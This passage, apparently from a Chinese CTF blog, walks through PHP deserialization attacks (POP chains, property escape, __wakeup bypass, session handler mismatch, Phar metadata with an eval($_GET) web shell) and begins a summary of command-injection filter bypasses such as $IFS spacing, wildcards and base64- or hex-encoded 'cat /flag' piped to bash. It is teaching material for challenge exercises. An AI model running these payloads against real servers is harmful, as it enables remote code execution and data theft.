Test();$b-&gt;p = $a;?&gt;\n此时我们需要想办法触发Test-&gt;__get函数，他的触发条件是被访问不存在的成员属性的时候触发，其实这里已经很明显了，Modifier和Test都利用完了，剩下的就是Show了，他在Show-&gt;__toString的时候调用了$this-&gt;str-&gt;source这个str我们完全可以自己控制，那怎么触发__toString呢？在Show-&gt;__wakeup中输出了一下source这个变量，那么我们可以就可以把具体构造好的丢给source然后就依次触发了echo $flag的命令。具体payload如下\n&lt;?phpclass Modifier&#123;    private $var = &quot;flag.php&quot;;&#125;class Test&#123;    public $p;&#125;class Show&#123;    public $source;    public $str;&#125;$a = new Modifier();$b = new Test();$b-&gt;p = $a;$c = new Show();$c-&gt;str = $b;$d = new Show();$d-&gt;source = $c;echo urlencode(serialize($d));?&gt;\n\n反序列化逃逸关于逃逸反序列化的时候会以;&#125;j结束，后面的字符串不影响正常的反序列化。关于逃逸的题目一般都不可以直接控制整个反序列化的数据，能够控制的可能只是被反序列化的成员变量，数据先经过依次serialize再经过unserialize，在这个中间反序列化的字符串变多或者变少的时候可能存在反序列化属性逃逸。\n增加例题增加例题如下\n&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($name)&#123;    $safe=array(&quot;flag&quot;,&quot;php&quot;);    $name=str_replace($safe,&quot;hack&quot;,$name);    return $name;&#125;class test&#123;    var $user;    var $pass=&#x27;daydream&#x27;;    function __construct($user)&#123;        $this-&gt;user=$user;    &#125;&#125;$param=$_GET[&#x27;param&#x27;];$param=serialize(new test($param));$profile=unserialize(filter($param));echo($profile-&gt;pass);if ($profile-&gt;pass==&#x27;escaping&#x27;)&#123;    echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;\n简单分析一下，这道题目可以传入param但是用户无法直接控制序列化时的反序列化字符串，因为是他在代码中生成的，传入的param会被丢进test的test-&gt;user变量中，但是他这里存在一个替换的问题，在filter里，他会把php全都替换成hack，我们需要想办法控制test-&gt;pass等于escaping，这里其实存在一个增加逃逸的漏洞，主要体现在filter函数中，它可以把咱们输入的数据替换掉，如果是php的话那就会增长的替换，我们可以把需要反序列化的内容的后半部分丢进去，然后采用php去把user当时定义好的长度填满，这样就造成了咱们的反序列化逃逸，我们需要逃逸的主要内容是test-&gt;pass，具体的序列化内容如下\n&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;\n前面的&quot;;是为了闭合上一个字符串数据，后面的;&#125;也是为了闭合当前反序列化数据的整体，他的长度是29，那么我们就需要溢出29个字符串，相当于需要溢出29个php那payload就如下\nphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;\n使用当前payload的话。在进行filter($param)之后的字符串如下\nO:4:&quot;test&quot;:2:&#123;s:4:&quot;user&quot;;s:116:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&quot;;s:4:&quot;pass&quot;;s:8:&quot;daydream&quot;;&#125;\nuser完美的把所有hack都吃掉了，然后就是咱们的数据。输出的flag在源代码中\n减少例题&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($name)&#123;    $safe = array(&quot;flag&quot;, &quot;php&quot;);    $name = str_replace($safe, &quot;hk&quot;, $name);    return $name;&#125;class test&#123;    var $user;    var $pass;    var $vip = false;    function __construct($user, $pass)    &#123;        $this-&gt;user = $user;        $this-&gt;pass = $pass;    &#125;&#125;$param = $_GET[&#x27;user&#x27;];$pass = $_GET[&#x27;pass&#x27;];$param = serialize(new test($param, $pass));$profile = unserialize(filter($param));if ($profile-&gt;vip) &#123;    echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;\n减少的这道例题我们最终要构建的是让test-&gt;vip变成true就会输出flag，但是true我们没办法直接控制，我们可以控制的字段只有test的user和pass，然后它里面话还有一个filter他会在序列化之后反序列化之前执行，他会更改咱们的序列化数据，这里就存在了逃逸漏洞，他会把php和flag都给替换成hk，我们可以先通过下面代码构造出咱们需要的反序列化数据\n&lt;?phpclass test&#123;    var $user = &quot;userdata&quot;;    var $pass = &quot;passdata&quot;;    var $vip = true;&#125;echo serialize(new test());?&gt;// 输出 O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:8:&quot;userdata&quot;;s:4:&quot;pass&quot;;s:8:&quot;passdata&quot;;s:3:&quot;vip&quot;;b:1;&#125;\n可以看到的是user在最前头，我们可以把user的长度搞的很大，让其filter缩小之后可以逃逸到pass和vip部分，那么我们需要逃逸数据如下\n&quot;;s:4:&quot;pass&quot;;s:8:&quot;passdata&quot;;s:3:&quot;vip&quot;;b:1;&#125;\n这些数据完全可以放入到pass中，但是因为长度问题我们需要把pass变量的名字给吃掉，按照当前的数据为例，因为vip无法控制我们拿到的序列化数据如下\nO:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:8:&quot;userdata&quot;;s:4:&quot;pass&quot;;s:8:&quot;passdata&quot;;s:3:&quot;vip&quot;;b:0;&#125;\n我们需要替换的内容，那具体总结出下图吃掉的这部分数据我们因该如何构建才会被吃掉？这里就需要利用filter这个过滤方法，我们需要吃掉的部分是\n&quot;;s:4:&quot;pass&quot;;s:8:&quot;\n他的长度是18，但我们需要注意的是，我们的pass最终肯定是一个长度大于10的，所以长度需要多算1位，当前是18，我们实际需要算19个，使用flag的话是双数的，算20个，20/2=10我们构造一个吃10个的param，然后在实际的数据中多加入一位，让其吃掉刚好就是20个，那么payload如下\nparam = flagflagflagflagflagflagflagflagflagflagpass = 1&quot;;s:4:&quot;pass&quot;;s:8:&quot;passdata&quot;;s:3:&quot;vip&quot;;b:1;&#125;\n\n其他技巧weakup绕过看一道例题，代码如下\n&lt;?phperror_reporting(0);class secret&#123;    var $file=&#x27;index.php&#x27;;    public function __construct($file)&#123;        $this-&gt;file=$file;    &#125;    function __destruct()&#123;        include_once($this-&gt;file);        echo $flag;    &#125;    function __wakeup()&#123;        $this-&gt;file=&#x27;index.php&#x27;;    &#125;&#125;$cmd=$_GET[&#x27;cmd&#x27;];if (!isset($cmd))&#123;    highlight_file(__FILE__);&#125;else&#123;    if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;,$cmd))&#123;        echo &quot;Are you daydreaming?&quot;;    &#125;    else&#123;        unserialize($cmd);    &#125;&#125;//sercet in flag.php?&gt;\n首先是我们不能触发wakeup，参考CVE-2016-7124，主要是把成员变量多加一个即可，本身他就一个成员变量，咱们给他加一个即可，然后关于正则，这个正则的意思是O:不能追加数字，如果是数字那么就会触发，这里用一个+来做拼接，需要url编码\n&lt;?phpclass secret&#123;    var $file = &#x27;index.php&#x27;;    public function __construct($file)    &#123;        $this-&gt;file = $file;    &#125;&#125;echo serialize(new secret(&#x27;flag.php&#x27;));echo &quot;\\n&quot;;echo urlencode(&#x27;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#x27;)?&gt;\nPS：这个是有版本要求的\n引用对比看一个例题\n&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun &#123;    var $enter;    var $secret;&#125;if (isset($_GET[&#x27;pass&#x27;])) &#123;    $pass = $_GET[&#x27;pass&#x27;];    $pass=str_replace(&#x27;*&#x27;,&#x27;\\*&#x27;,$pass);&#125;$o = unserialize($pass);if ($o) &#123;    $o-&gt;secret = &quot;*&quot;;    if ($o-&gt;secret === $o-&gt;enter)        echo &quot;Congratulation! Here is my secret: &quot;.$flag;    else        echo &quot;Oh no... You can&#x27;t fool me&quot;;&#125;else echo &quot;are you trolling?&quot;;?&gt;\n这道题目的问题在于enter不允许只输入*它会被替换掉，然后secret又在对比的时候肯定等于*，这里我们可以使用引用的方式去做，类似于C的指针，具体的解题方式如下\n&lt;?phpclass just4fun&#123;    var $enter;    var $secret;&#125;$a = new just4fun();$a-&gt;enter = &amp;$a-&gt;secret;echo serialize($a);\n\nSession反序列化漏洞关于session当session_start()被调用或者php.ini中session.auto_start为1的时候，php内部会调用会话管理器，访问用户的部分数据被序列化后会存储在指定目录，默认为网站根目录的tmp目录。存储数据的格式有很多种，常用的有三种下面会进行列举，然后漏洞的产生一般都是写入的格式和读取的格式不一致。\n\n\n\n处理方式\n对应处理格式\n\n\n\nphp\n键名+竖线+经过serialize()函数序列化处理的值\n\n\nphp_binar\n键名的长度对应的ASCII字符+键名+经过serialize()函数樊旭蕾话处理的值\n\n\nphp_serialize\n经过serialize()函数序列化处理的数组。\n\n\n简单举例，代码如下\n\n\n\n&lt;?phphighlight_file(__FILE__);error_reporting(0);session_start();$_SESSION[&#x27;benben&#x27;] = $_GET[&#x27;ben&#x27;];?&gt;\n当传入的数据是asdf的时候那么在网站根目录的tmp下的内容如下\nroot@726be1c353d8:/var/www/html/tmp# cat sess_rg9jedp1io4ntt6slr510h9d36benben|s:4:&quot;asdf&quot;;\n再看一下php_serialize的形式，代码如下\n&lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;benben&#x27;] = $_GET[&#x27;ben&#x27;];$_SESSION[&#x27;b&#x27;] = $_GET[&#x27;b&#x27;];?&gt;\n我输入的payload是ben=ls&amp;b=lls，那么在本地存储的数据长这样\nroot@726be1c353d8:/var/www/html/tmp# cat sess_rg9jedp1io4ntt6slr510h9d36a:2:&#123;s:6:&quot;benben&quot;;s:2:&quot;ls&quot;;s:1:&quot;b&quot;;s:3:&quot;lls&quot;;&#125;\n如果是php_binary的形式，可以用下面的代码测试\n&lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);session_start();$_SESSION[&#x27;benben&#x27;] = $_GET[&#x27;ben&#x27;];$_SESSION[&#x27;b&#x27;] = $_GET[&#x27;b&#x27;];?&gt;\n传入的值依旧是ben=ls&amp;b=lls，存储的内容如下\nroot@726be1c353d8:/var/www/html/tmp# cat sess_rg9jedp1io4ntt6slr510h9d36benbens:2:&quot;ls&quot;;bs:3:&quot;lls&quot;;\n利用原理简单来一个例子大家就可以知道漏洞的产生原理了，下面有两个页面，全都存储到同一个网站目录下，第一个是漏洞提交页\n&lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;ben&#x27;] = $_GET[&#x27;a&#x27;];?&gt;\n还有一个是漏洞验证页面\n&lt;?php highlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();class D&#123;    var $a;    function __destruct()&#123;        eval($this-&gt;a);    &#125;&#125;?&gt;\n在漏洞验证页面有一个D类，可以把里面的a变量当作代码去执行，在session启动的时候他会去读取本地存储的session，因为session存储方式基本都是序列化之后的，所以这里会产生反序列化的操作，从而触发D，那我们应该如何去触发D的反序列化呢？这里我们构造一个payload在漏洞提交页给打进去，具体payload如下\n&lt;?phpclass D&#123;    var $a = &quot;system(&#x27;id&#x27;);&quot;;&#125;echo serialize(new D());?&gt;\n拿到下面内容\nO:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&#x27;id&#x27;);&quot;;&#125;\n我们给前面加入一个|，也就是完整的payload会变成下面样子\n|O:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&#x27;id&#x27;);&quot;;&#125;\n被存储在session之后的数据就会长这样\na:1:&#123;s:3:&quot;ben&quot;;s:42:&quot;|O:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&#x27;id&#x27;);&quot;;&#125;&quot;;&#125;\n我们再次访问漏洞验证页就会直接发现id命令被执行了具体的原理就是说在php这部分去识别session的时候会把\na:1:&#123;s:3:&quot;ben&quot;;s:42:&quot;|O:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&#x27;id&#x27;);&quot;;&#125;&quot;;&#125;\na:1:&#123;s:3:&quot;ben&quot;;s:42:&quot;识别成名字，然后后面的数据会被直接反序列化，就导致直接触发了D-&gt;__destruct魔术方法。\n例题练习具体代码如下\n&lt;?phphighlight_file(__FILE__);/*hint.php*/session_start();class Flag&#123;    public $name;    public $her;    function __wakeup()&#123;        $this-&gt;her=md5(rand(1, 10000));        if ($this-&gt;name===$this-&gt;her)&#123;            include(&#x27;flag.php&#x27;);            echo $flag;        &#125;    &#125;&#125;?&gt;\n其中hint.php的代码如下\n&lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;a&#x27;] = $_GET[&#x27;a&#x27;];?&gt;\n具体的绕过思路就是通过引用绕过，思路和原理基本上是一模一样，具体的payload生成代码如下\n&lt;?phpclass Flag&#123;    public $name;    public $her;&#125;$a = new Flag();$a-&gt;name = &amp;$a-&gt;her;echo serialize($a);?&gt;\n之后输入的payloay需要前面加入一个|\n|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;\n即可拿到flag\nPhar反序列化漏洞关于Pharphar可以理解为php的一种压缩包，也可以理解为java中的jar包，让后对于php5.3或者更高的版本，phar后缀文件默认开启支持可以直接使用他。他的结构如下\nstub phar 文件头部，格式为xxx&lt;?php xxx;__HALT_COMPILER();?&gt;manifest  压缩文件的属性信息，以序列化存储contents  压缩文件的内容signature 前面，放在文件末尾\nphar协议解析的时候会自动触发对manifest字段的序列化字符串进行反序列化。然后可以自动直接识别phar文件的函数如下\nfileatime、filectime、file_exists、file_get_contents、file_put_contents、file、filegroup、fopen、fileinode、filemtime、fileowner、fileperms、is_dir、is_executable、is_file、is_link、is_readable、is_writable、is_writeable、parse_ini_file、copy、unlink、stat、readfile\n利用原理利用原理就是在加载phar的时候必定会进行反序列化的操作，具体就是反序列化的位置就是phar的manifest部分，下面给一个通用的poc脚本，代码如下\n&lt;?phpclass Testobj&#123;    var $output=&#x27;&#x27;;&#125;@unlink(&#x27;test.phar&#x27;);   //删除之前的test.par文件(如果有)$phar=new Phar(&#x27;test.phar&#x27;);  //创建一个phar对象，文件名必须以phar为后缀$phar-&gt;startBuffering();  //开始写文件$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);  //写入stub$o=new Testobj();$o-&gt;output=&#x27;eval($_GET[&quot;a&quot;]);&#x27;;$phar-&gt;setMetadata($o);//写入meta-data$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件$phar-&gt;stopBuffering();?&gt;\n需要自己改动的位置是下面几个部分，需要替换成自己想要的对应数据\nclass Testobj&#123;    var $output=&#x27;&#x27;;&#125;$o=new Testobj();$o-&gt;output=&#x27;eval($_GET[&quot;a&quot;]);&#x27;;\n例题练习例题直接打开的代码如下\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class TestObject &#123;    public function __destruct() &#123;        include(&#x27;flag.php&#x27;);        echo $flag;    &#125;&#125;$filename = $_POST[&#x27;file&#x27;];if (isset($filename))&#123;    echo md5_file($filename);&#125;//upload.php?&gt;\n然后upload.php的代码如下\n&lt;!DOCTYPE html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;上传图片文件&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;        &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;上传&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phperror_reporting(0);$allowedExs=array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);$temp=explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);$extension=end($temp);if (($_FILES[&quot;file&quot;][&quot;type&quot;])==&quot;image/gif&quot;    ||($_FILES[&quot;file&quot;][&quot;type&quot;])==&quot;image/jpeg&quot;    ||($_FILES[&quot;file&quot;][&quot;type&quot;])==&quot;image/jpg&quot;    ||($_FILES[&quot;file&quot;][&quot;type&quot;])==&quot;image/pjpeg&quot;    ||($_FILES[&quot;file&quot;][&quot;type&quot;])==&quot;image/x-png&quot;    ||($_FILES[&quot;file&quot;][&quot;type&quot;])==&quot;image/png&quot;    &amp;&amp;($_FILES[&quot;file&quot;][&quot;size&quot;])&lt;204800    &amp;&amp;in_array($extension,$allowedExs))&#123;    if($_FILES[&quot;file&quot;][&quot;error&quot;]&gt;0)&#123;        echo &quot;错误：&quot;.$_FILES[&quot;file&quot;][&quot;error&quot;].&quot;&lt;br/&gt;&quot;;    &#125;    else&#123;        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]);        echo &quot;文件储存在&quot;.&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];        &#125;    &#125;else&#123;    echo &quot;mybe hack?&quot;;&#125;\n这道题目在上传的时候有个类型过滤，这里把poc生成的phar修改成png即可。其他的就没啥了，就是上传phar文件然后让第一个页面去加载即可。下面是这道题目的poc\n&lt;?phpclass Testobj&#123;    var $output=&#x27;&#x27;;&#125;@unlink(&#x27;test.phar&#x27;);   //删除之前的test.par文件(如果有)$phar=new Phar(&#x27;test.phar&#x27;);  //创建一个phar对象，文件名必须以phar为后缀$phar-&gt;startBuffering();  //开始写文件$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);  //写入stub$o=new Testobj();$o-&gt;output=&#x27;eval($_GET[&quot;a&quot;]);&#x27;;$phar-&gt;setMetadata($o);//写入meta-data$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件$phar-&gt;stopBuffering();?&gt;\n\n","categories":["CTF相关","WEB"],"tags":["CTF","WEB","PHP","反序列化"]},{"title":"WEB-PHP命令执行总结","url":"/2025/06/16/WEB-PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%80%BB%E7%BB%93/","content":"常见命令执行函数system&lt;?phperror_reporting(0);highlight_file(__FILE__);$cmd = $_GET[&quot;benben&quot;];if(isset($cmd))&#123;    system($cmd);&#125;?&gt;\n可以直接把命令丢给system，他会直接运行并且输出返回的内容。\nexec()&lt;?phperror_reporting(0);highlight_file(__FILE__);$cmd = $_GET[&quot;cmd&quot;];exec($cmd,$array);print_r($array);?&gt;\n需要传入两个参数，一个是命令，一个是执行后的命令回显存放位置，想要看运行结果需要单独的输出。\npassthru()&lt;?phperror_reporting(0);highlight_file(__FILE__);$cmd = $_GET[&quot;cmd&quot;];echo &quot;This is test!!!&quot;;passthru($cmd);?&gt;\n和system相同，运行直接回显\nshell_exec()&lt;?phperror_reporting(0);highlight_file(__FILE__);$cmd = $_GET[&quot;cmd&quot;];$output = shell_exec($cmd);echo $output;?&gt;\n传入命令后会返回一个数据，这个数据就是命令执行后的回显，也需要单独输出。\n反引号``&lt;?phperror_reporting(0);highlight_file(__FILE__);$cmd = $_GET[&quot;cmd&quot;];echo `$cmd`,PHP_EOL;?&gt;\n运行需要手动echo\npopen&lt;?phperror_reporting(0);highlight_file(__FILE__);$cmd = $_GET[&quot;cmd&quot;];$ben = popen($cmd,&#x27;r&#x27;);while($s=fgets($ben))&#123;    print_r($s);&#125;?&gt;\n传入两个变量，第一个是命令，第二个是模式，一般是r和w分别代表读取和写入。底层实际就是开一个现成用来接收数据，函数打开一个进程管道，可以用来执行命令并读取其输出或写入数据。它以文件流的方式处理命令输出，需要手动构造 var_dump() &#x2F; print_r 语句来显示输出。\nproc_open&lt;?phperror_reporting(0);header(&quot;content-type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);$cmd = $_GET[&quot;cmd&quot;];$array =   array(    array(&quot;pipe&quot;,&quot;r&quot;),   //标准输入    array(&quot;pipe&quot;,&quot;w&quot;),   //标准输出内容    array(&quot;file&quot;,&quot;/tmp/error-output.txt&quot;,&quot;a&quot;)    //标准输出错误);$fp = proc_open($cmd,$array,$pipes);   //打开一个进程通道echo stream_get_contents($pipes[1]);    //为什么是$pipes[1]，因为1是输出内容proc_close($fp);?&gt;\n需要传入三个参数，第一个是执行的命令，第二个是参数，然后第三个是调用数组的内容，0表示输入，1表示输出，默认没回显，需要知道即可，不常用。\npcntl_exec&lt;?phperror_reporting(0);highlight_file(__FILE__);$cmd=$_GET[&#x27;cmd&#x27;];pcntl_exec(&quot;/bin/bash&quot;,array(&quot;-c&quot;,$cmd));\n需要传入两个参数，第一个是二进制文件，第二个是运行参数，然后他需要拥有前置模块才可以用。\n函数限制绕过&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;); highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;cmd&#x27;]))&#123;    $c = $_GET[&#x27;cmd&#x27;];    if(!preg_match(&quot;/exec|system|popen|proc_open|\\`/i&quot;, $c))&#123;        eval($c);    &#125;    else&#123;        echo &quot;你是黑客么？&quot;;    &#125;&#125;\n禁止了一些函数的使用，命令执行的函数有多种，用其他的命令函数绕过不多说，它还可以用文件包含、还有一些编码绕过base64、urldecode等等，可用payload如下\neval(urldecode(&quot;syste%256d(%27dir%27);&quot;));eval(base64_decode(%22c3lzdGVtKCdkaXInKTs=%22));\n命令拼接绕过&lt;?phphighlight_file(__FILE__);error_reporting(0);$cmd = $_GET[&quot;cmd&quot;];if(isset($cmd))&#123;    system(&quot;ls&quot;.$cmd);&#125;?&gt;\n上面的这个解法比较简单通过;、&amp;、&amp;&amp;、|、||都可以，其实这种的绕过方法还是蛮多的，要注意的是如果要用&amp;的话，需要url编码，因为他是传参的分割符。\n&lt;?phphighlight_file(__FILE__);error_reporting(0);$cmd = $_GET[&quot;cmd&quot;];$cmd = $cmd.&quot; &gt;/dev/null 2&gt;&amp;1&quot;;if(isset($cmd))&#123;    system($cmd);&#125;?&gt;\n这个相同的，用;和||都可以，其中||的含义是指前面的命令执行成功则就不执行后面的命令\n空格过滤绕过&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);error_reporting(0);$cmd = $_GET[&quot;cmd&quot;];if(isset($cmd))&#123;    $cmd = preg_replace(&quot;# #&quot;,&quot;&quot;,$cmd);    echo &quot;过滤后的命令：&quot;.$cmd.&quot;&lt;/br &gt;&quot;;    echo &quot;命令执行结果如下：&quot;;    system($cmd);&#125;?&gt;\npreg_replace会把所有的空格替换成空，也就是函数所有的空格都会剔除。这种的绕过方式有很多种，这里简单列举一些常用的&#123;cat,/flag&#125;、cat$IFS/flag、cat$&#123;IFS&#125;/flag、cat$IFS$9/flag，这些$相关的都是linux内置的一些环境变量，都可以代表空格来用，然后$IFS是不可以直接在终端中当作空格使用的，原因是因为没有界定符，例如\ncat$IFScmd.sh\n他会把IFScmd都当作环境变量，具体就可以采用$&#123;IFS&#125;来解决，然后后面加一个$9的作用也可以理解为做一个变量的分割。然后重定向可以用来空格绕过，例如cat&lt;/flag、cat&lt;&gt;/flag，具体就是把文件输出给命令，不多说了可以自己多试试。除去上面的还有通过URL编码的绕过，具体就是采用%09代表的是tab键，本身tab敲出来也会是一个长空格所以也可以，然后%20不一定行，因为它本身就是空格，有些题目也可以绕过。简单汇总一下\n&#123;cat,/flag&#125;cat$IFS/flagcat$&#123;IFS&#125;/flagcat$IFS$9/flagcat&lt;/flagcat&lt;&gt;/flagcat%09/flagcat%20/flag\n文件名过滤绕过&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;cmd&#x27;])) &#123;    $cmd = $_GET[&#x27;cmd&#x27;];    if (!preg_match(&quot;/flag|system|php/i&quot;, $cmd)) &#123;        eval($cmd);    &#125;    else&#123;        echo &quot;命令有问题哦，来黑我丫！！！&quot;;        &#125;&#125;\n执行的函数不多说了，可以直接用其他的命令执行函数，主要是flag看不了，第一种方法添加?，例如cat /fla?、/bin/ca? /?la?，这算Linux的一个语法糖了。第二种就是引号绕过cat /f&#39;&#39;lag、cat /f&quot;&quot;lag单双引号都可以，对于linux来说双引号单引号就是可以代表拼接一下。第三种反斜杠\\，他一般用来当作转义符，但是直接运行在linux中他的含义是拼接符，就是可以用来换行敲命令的一个符号，换行自动拼接，也可以用到这里cat /fla\\g、cat /f\\la\\g，这个相当于这样运行的\ncat /fla\\gcat /f\\la\\g\n第四种是可以通过特殊的环境变量来是实现，例如$1到$9都可以尝试，还有$@、$*等等…第五种可以通过内联执行的方式去运行，例如a=f;d=ag;c=l;cat /$a$c$d，实际就是执行的cat /flag。第六种依旧是通过环境变量，参考我的PATH环境，如下\n┌──(root㉿BoyChaiWindows)-[~/temp/zongjie]└─# echo $PATH/root/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/usr/lib/wsl/lib:/mnt/d/VMware Workstation/bin/:/mnt/c/Windows/system32:/mnt/c/Windows:/mnt/c/Windows/System32/Wbem:/mnt/c/Windows/System32/WindowsPowerShell/v1.0/:/mnt/c/Windows/System32/OpenSSH/:/mnt/d/Microsoft VS Code/bin:/mnt/c/Program Files/dotnet/:/mnt/e/Environment/miniconda3/condabin:/mnt/d/Git/cmd:/mnt/c/Program Files/WireGuard/:/mnt/e/Environment/jdk-17.0.0.1/bin:/mnt/e/Environment/go-v1.24.2/bin:/mnt/c/Users/BoyChai/go/bin:/mnt/e/Other/Bin:/mnt/e/Environment/msys64:/mnt/e/Environment/msys64/mingw64/bin:/mnt/e/Environment/node-v22.15.0-win-x64:/mnt/d/Tencent/微信web开发者工具/dll:/mnt/d/Tools/QtScrcpy-win-x64-v3.2.0:/mnt/d/Wireshark:/mnt/c/Users/BoyChai/AppData/Local/Microsoft/WindowsApps:/mnt/d/Tools/Fiddler:/mnt/d/Lens/resources/cli/bin:/mnt/c/Users/BoyChai/AppData/Local/Muse Hub/lib:/root/.dotnet/tools\n里面可能能频出一个flag，我们把字符挨个提取出来，例如这样\n┌──(root㉿BoyChaiWindows)-[~/temp/zongjie]└─# echo $&#123;PATH:326:1&#125;$&#123;PATH:31:1&#125;$&#123;PATH:14:1&#125;$&#123;PATH:92:1&#125;flag\n也可以具体就是从第几个开始的第几个。第七种方式就是base64，例如下面几种方式\n`echo Y2F0IC9mbGFn |base64 -d`echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash\n下面汇总一下\ncat /fla?/bin/ca? /?la?cat /f&#x27;&#x27;lagcat /f&quot;&quot;lagcat /fla\\gcat /f\\la\\gcat /f$&#123;1&#125;lagcat a=f;d=ag;c=l;cat /$a$c$decho $&#123;PATH:326:1&#125;$&#123;PATH:31:1&#125;$&#123;PATH:14:1&#125;$&#123;PATH:92:1&#125; # 需要根据环境变量自己拼`echo Y2F0IC9mbGFn |base64 -d`echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash\n文件读取绕过&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;cmd&#x27;])) &#123;    $cmd = $_GET[&#x27;cmd&#x27;];    if (!preg_match(&quot;/flag|php|cat|sort|shell|\\&#x27;/i&quot;, $cmd)) &#123;        eval($cmd);    &#125;    else&#123;        echo &quot;再来黑我丫！！！&quot;;    &#125;&#125;\n这种是限制了传入时的一些查看文件的命令，替代品有很多，第一种tac是反向显示文件内容，cat是正向他是反向。第二种more也可以，他也是一个查看文件内容的命令。第三种less和more差不多。第四种tail查看末尾几行数据。第五种nl显示的时候顺便输出行号，和cat几乎一样，只是多一个行号的显示。第六种od按照二进制的形式读取文件。第七种xxd读取二进制文件。第八种sort，用来排序的也可以用来展示数据内容。第九种uniq去除重复内容的，或者统计。第十种file -f这个会报错出具体的文本内容。第十一种grep查找字符串，不加内容和cat差不多。上面这些都是通过命令，这里依旧可以通过base64的形式绕过，例如echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash。下面汇总一下\ntac、more、less、tail、nl、od、xxd、sort、uniq、file -f、grep......`echo Y2F0IC9mbGFn |base64 -d`echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash\n编码解码绕过&lt;?phpheader(&quot;content-type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;cmd&#x27;])) &#123;    $cmd = $_GET[&#x27;cmd&#x27;];    if (!preg_match(&quot;/flag|php|cat|sort|shell/i&quot;, $cmd)) &#123;        eval($cmd);    &#125;    else&#123;        echo &quot;再来黑我丫！！！&quot;;    &#125;&#125;\n例题依旧采用文件读取绕过的那道题目，很多情况都可以通过当前办法进行绕过，在文件名字那的时候就已经尝试使用base64的形式绕过，这里多说一些，如果题目直接就是次啊用eval的形式，那么就说明咱们可以通过php代码进行绕过，例如上面函数限制绕过\n# eval执行eval(urldecode(&quot;syste%256d(%27dir%27);&quot;));eval(base64_decode(%22c3lzdGVtKCdkaXInKTs=%22));# base64`echo Y2F0IC9mbGFn |base64 -d`echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash# base32echo MNQXIIBPMZWGCZY=|base32 -d |bash# hex 有些可能没有xxd命令echo 636174202f666c6167 |xxd -r -p|bashprintf 